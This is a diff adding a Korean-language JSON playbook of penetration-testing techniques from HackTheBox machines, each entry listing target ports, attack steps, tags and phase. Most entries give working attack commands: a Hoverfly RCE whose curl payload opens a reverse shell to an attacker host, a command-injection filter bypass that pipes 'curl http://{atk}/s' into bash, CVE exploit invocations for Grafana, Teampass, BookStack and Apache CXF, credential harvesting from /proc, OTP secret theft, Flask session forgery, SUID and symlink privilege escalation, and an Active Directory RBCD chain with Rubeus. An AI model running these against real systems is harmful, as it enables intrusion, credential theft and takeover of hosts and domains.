@@ -1,0 +1,132 @@
+[
+  {
+    "name": "Grafana SQL Expressions RCE(CVE-2024-9264)",
+    "when": {"ports": [3000, 80, 443], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Planning: Grafana <=11.0.x (Help 아이콘에 버전). SQL Expressions 실험기능이 DuckDB CLI 로 미정제 SQL 처리 → RCE+LFI(Viewer 권한+). 공개 POC: python3 CVE-2024-9264.py --url http://<host> --username admin --password <pw> --reverse-ip {atk} --reverse-port 9001 → 보통 Docker 컨테이너 root. duckdb 바이너리 필요.",
+    "tags": ["web", "grafana", "cve-2024-9264", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "crontab.db/cron UI → root 작업",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Planning: 내부 crontab UI(예: 8000) + /opt/.../crontab.db 에 평문비번/root cron. ss -tln 로 내부포트 → ssh -L 포워딩. cat crontab.db(JSON) → 평문자격+command. UI 로그인 후 New cron: 'chmod u+s /bin/bash' → Run now → bash -p → root. cron 이 root 로 실행되는지 확인.",
+    "tags": ["linux", "cron", "privesc"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Apache NiFi Processor RCE",
+    "when": {"ports": [8080, 8443, 80, 443], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Helix: Apache NiFi(data-flow) 는 ExecuteProcess/ExecuteScript 류 프로세서로 명령실행 가능. msf use exploit/multi/http/apache_nifi_processor_rce; set vhost <host>; set RHOSTS http://{t}; set LHOST {atk}; run → nifi 서비스계정 셸. 진단 번들/백업 디렉토리에 SSH 키 흔함.",
+    "tags": ["web", "nifi", "rce", "metasploit"],
+    "phase": "access"
+  },
+  {
+    "name": "OPC UA / ICS 제어 열거(asyncua)",
+    "when": {"ports": [4840], "services": ["opcua", "opc"]},
+    "suggest": [],
+    "note": "HTB Helix: OPC UA(ICS/OT) opc.tcp://host:4840/. python asyncua: Client(url) 로 연결 → nodes.objects.get_children() 로 노드 트리. UserAccessLevel bit 0x02=write 로 쓰기가능 변수 식별. 제어논리(가이드 PDF) 이해해 안전상태 유도(메모리커럽션 아님). 내부면 ssh -L 포워딩. pdf2john 로 보호 PDF 크랙.",
+    "tags": ["ics", "opcua", "asyncua"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Teampass SQLi(CVE-2023-1545)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Checker: Teampass <3.0.0.22 → CVE-2023-1545 SQLi(입력검증 미흡). 공개 PoC(teampass_cve.sh http://<host>) → 사용자 bcrypt 해시 → hashcat -m3200 rockyou → 로그인 후 저장된 자격(공유 폴더)에서 타 서비스 자격 획득.",
+    "tags": ["web", "teampass", "cve-2023-1545", "sqli"],
+    "phase": "access"
+  },
+  {
+    "name": "BookStack PHP 필터체인 파일읽기(CVE-2023-6199)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Checker: BookStack 23.10.x(소스 meta version) → CVE-2023-6199 Blind SSRF/로컬파일읽기(/ajax/page/<id>/save-draft html 파라미터, file_get_contents). synacktiv php_filter_chains_oracle_exploit 사용(requestor.py 를 base64 img 태그로 수정). 자격 필요. /etc/passwd, 백업경로의 민감파일 읽기.",
+    "tags": ["web", "bookstack", "cve-2023-6199", "lfi"],
+    "phase": "access"
+  },
+  {
+    "name": "2FA(Google Authenticator) 시크릿 → OTP 우회",
+    "when": {"ports": [22], "services": ["ssh"]},
+    "suggest": [],
+    "note": "HTB Checker: SSH 2FA(verification code) 활성 시 ~/.google_authenticator 파일(시크릿)을 파일읽기 취약점으로 유출. oathtool --totp -b <시크릿> → 현재 OTP 생성 → ssh <user>@{t} (비번+OTP) 로그인. 시크릿은 base32(첫 줄).",
+    "tags": ["ssh", "2fa", "oathtool", "bypass"],
+    "phase": "access"
+  },
+  {
+    "name": "바이너리 리버스 엔지니어링(Ghidra/ILSpy)",
+    "when": {},
+    "suggest": [],
+    "note": "HTB Checker/Support: SMB 공유/FTP 의 커스텀 바이너리는 RE 로 로직·자격 분석. ELF=Ghidra 디컴파일(main 의 getenv/system/sprintf 추적). .NET=ILSpy(Linux AvaloniaILSpy)/dnSpy → 하드코딩 자격·XOR 복호화 로직. XOR 예: for e,k in zip(b64decode(enc),cycle(key)): out+=chr(e^k^const). sudo 바이너리/SUID 의 경쟁조건·명령주입도 RE 로 발견.",
+    "tags": ["re", "ghidra", "ilspy", "binary"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Apache CXF Aegis SSRF(CVE-2024-28752, XOP)",
+    "when": {"ports": [8080, 80, 443], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB DevArea: Java SOAP(Apache CXF + Aegis databinding, pom.xml/jd-gui 로 확인). WSDL(/service?wsdl) 로 요청구조 파악. CVE-2024-28752: SOAP content 필드에 XOP Include → file:// 임의파일읽기. multipart/related type=xop+xml 로 전송, <xop:Include href=\"file:///etc/passwd\"/> → 응답 base64. /proc/<PID>/cmdline 순회로 프로세스 인자의 평문자격 수집.",
+    "tags": ["web", "cxf", "cve-2024-28752", "ssrf", "xxe"],
+    "phase": "access"
+  },
+  {
+    "name": "/proc/PID/cmdline 자격 수집",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB DevArea: 파일읽기(LFI/SSRF) 또는 셸 확보 시 /proc/<PID>/cmdline 순회(PID 1..2000) → 프로세스 시작 인자의 평문자격(-password, -u/-p, 토큰). 셸에서는 ps auxww, cat /proc/*/environ 도. 서비스가 CLI 인자로 자격 전달 시 노출.",
+    "tags": ["linux", "proc", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "Hoverfly 미들웨어 RCE(CVE-2025-54123)",
+    "when": {"ports": [8888, 8500], "services": ["http"]},
+    "suggest": [],
+    "note": "HTB DevArea: Hoverfly <=1.11.3 Admin UI(8888). TOKEN=$(curl -XPOST http://{t}:8888/api/token-auth -d '{\"username\":\"admin\",\"password\":\"<pw>\"}'|jq -r .token). curl -XPUT http://{t}:8888/api/v2/hoverfly/middleware -H \"Authorization: Bearer $TOKEN\" -d '{\"binary\":\"/bin/bash\",\"script\":\"bash -i >& /dev/tcp/{atk}/4444 0>&1\"}' → RCE. 자격은 /proc cmdline 등에서.",
+    "tags": ["web", "hoverfly", "cve-2025-54123", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "Flask 세션 위조(SECRET_KEY 노출)",
+    "when": {"ports": [80, 443, 5000, 7777], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB DevArea: Flask SECRET_KEY 노출 시(world-readable env, 소스, 설정) 임의 세션 위조. flask-unsign --sign --cookie \"{'user_id':1,'username':'admin'}\" --secret '<KEY>', 또는 itsdangerous URLSafeTimedSerializer(KEY, salt='cookie-session', TaggedJSONSerializer(), signer_kwargs={'key_derivation':'hmac','digest_method':hashlib.sha1}).dumps({...}) → session 쿠키 교체 → 인증우회/권한상승.",
+    "tags": ["web", "flask", "session-forgery"],
+    "phase": "access"
+  },
+  {
+    "name": "명령주입 문자 재구성 우회",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB DevArea/Nocturnal: 블랙리스트(/ . 대문자 ; & 공백 차단)여도 파이프 | 허용 시 명령연결. 공백→${IFS}/탭(%09). / 재구성: $(eval \"echo \\$$(echo path|awk '{print toupper($0)}')\")|awk '{print substr($0,1,1)}' ($PATH 첫글자). . 재구성: ls 파일명에서 awk substr. 조립 후 curl http://{atk}/s|bash. 소스 열람 가능하면 블랙리스트 정규식 확인.",
+    "tags": ["web", "command-injection", "filter-bypass"],
+    "phase": "access"
+  },
+  {
+    "name": "심볼릭 링크 체인 우회(루트 리더)",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB DevArea: root 로 실행되는 파일 리더(sudo CLI/로그뷰어)가 심볼릭 즉시 타깃만 검증(1홉)할 때. 쓰기가능 디렉토리에서 체인: ln -s /root/root.txt inter.log; ln -sf inter.log allowed.log (검증은 allowed.log->inter.log 만 봄=통과) → root 리더가 체인 따라 /root/root.txt(또는 /root/.ssh/id_rsa) 유출. getcap/getfacl 로 권한 확인.",
+    "tags": ["linux", "symlink", "privesc"],
+    "phase": "privesc"
+  },
+  {
+    "name": "LDAP 비표준 필드 자격",
+    "when": {"ports": [389, 3268], "services": ["ldap"], "os": ["windows_ad"]},
+    "suggest": [
+      "ldapsearch -x -H ldap://{t} -D BIND_DN -w PASS -b \"dc=DOMAIN,dc=LOCAL\" \"*\""
+    ],
+    "note": "HTB Support: LDAP 바인드 후 전체 속성 덤프 시 비표준 필드(info, description, comment, userPassword)에 평문/힌트 비번. ldapsearch '*' 로 모든 속성 조회, Apache Directory Studio 로 GUI 탐색. 바인드 자격은 커스텀 바이너리 RE/Wireshark bindRequest 스니핑으로 획득.",
+    "tags": ["ad", "ldap", "creds"],
+    "phase": "access"
+  },
+  {
+    "name": "GenericAll on Computer → RBCD(Powermad+Rubeus)",
+    "when": {"ports": [389, 445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Support: 사용자/그룹이 컴퓨터(특히 DC)에 GenericAll/WriteDACL → RBCD. 전제: ms-DS-MachineAccountQuota>0(Get-ADObject -Properties ms-DS-MachineAccountQuota). 1) Powermad New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Pass123' -AsPlainText -Force). 2) Set-ADComputer <TARGET> -PrincipalsAllowedToDelegateToAccount FAKE01$. 3) Rubeus.exe hash /password:Pass123 /user:FAKE01$ /domain:<dom> → rc4. 4) Rubeus.exe s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target.fqdn> /ptt → wmiexec. (리눅스: impacket addcomputer + rbcd.py + getST -impersonate).",
+    "tags": ["ad", "rbcd", "genericall", "rubeus"],
+    "phase": "privesc"
+  }
+]
